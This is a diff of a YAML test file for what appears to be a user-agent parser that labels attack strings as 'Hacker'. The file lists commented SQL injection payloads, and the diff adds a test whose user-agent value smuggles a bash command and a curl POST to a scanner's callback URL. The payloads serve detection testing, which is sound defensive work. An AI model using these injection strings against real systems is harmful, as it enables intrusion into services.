@@ -608,7 +608,7 @@ config:
       HackerToolkit                        : 'Unknown'
 
 
-# TODO: More hack attempts to detect
+# For reference:
 #-8067)) AS trzU WHERE 3801=3801 OR MAKE_SET(7172=7172,6095)--
 #-2734')) AS YnXr WHERE 1760=1760 OR MAKE_SET(7172=7172,6095)--
 #-3358'))) OR MAKE_SET(9429=7340,7340) AND ((('QIPX' LIKE 'QIPX
@@ -652,6 +652,34 @@ config:
 #(SELECT (CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9479=9479) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))
 #(SELECT (CASE WHEN (9814=1041) THEN CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(47)+CHAR(49)+CHAR(46)+CHAR(48)+CHAR(45)+CHAR(100)+CHAR(101)+CHAR(118)+CHAR(45)+CHAR(110)+CHAR(111)+CHAR(110)+CHAR(103)+CHAR(105)+CHAR(116)+CHAR(45)+CHAR(50)+CHAR(48)+CHAR(49)+CHAR(53)+CHAR(48)+CHAR(57)+CHAR(48)+CHAR(57)+CHAR(32)+CHAR(40)+CHAR(104)+CHAR(116)+CHAR(116)+CHAR(112)+CHAR(58)+CHAR(47)+CHAR(47)+CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(46)+CHAR(111)+CHAR(114)+CHAR(103)+CHAR(41) ELSE 9814*(SELECT 9814 FROM master..sysdatabases) END))
 #(select convert(int,CHAR(65)))
+
+- test:
+    input:
+      user_agent_string: '(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Unknown'
+      HackerToolkit                        : 'Unknown'
+      __SyntaxError__                      : 'true'
 
 - test:
     input:
